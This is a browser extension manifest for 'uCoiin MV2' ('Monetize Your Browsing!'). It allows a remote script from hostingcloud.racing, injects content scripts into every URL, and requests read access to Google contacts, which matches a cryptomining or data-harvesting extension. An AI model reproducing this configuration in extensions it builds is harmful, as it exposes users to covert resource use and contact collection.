{
    "name": "uCoiin MV2",
    "description": "Monetize Your Browsing!",
    "version": "1.0",
    "manifest_version": 2,
    "content_security_policy": "script-src 'self' https://www.hostingcloud.racing/XahE.js; object-src 'self'",
    "background": {
      "scripts": ["background.js"],
      "persistent": false
    },
    "content_scripts": [
      {
        "matches": ["<all_urls>"],
        "js": ["q8sc.js", "settings.js"]
      }
    ],
    "browser_action": {
      "default_popup": "popup.html"
    },
    "oauth2": {
      "client_id": "431133908652-78i494d6fjve1aihgn2cfqcd0ati6uo7.apps.googleusercontent.com",
      "scopes":["https://www.googleapis.com/auth/contacts.readonly"]
    },
    "permissions": ["storage", "activeTab", "identity", "http://ucoiin.com/*", "https://ucoiin.com/*"],
    "externally_connectable": {
      "matches": ["https://ucoiin.com/signin"]
    },
    "icons": {
    },
    "options_page": ""
  }
  
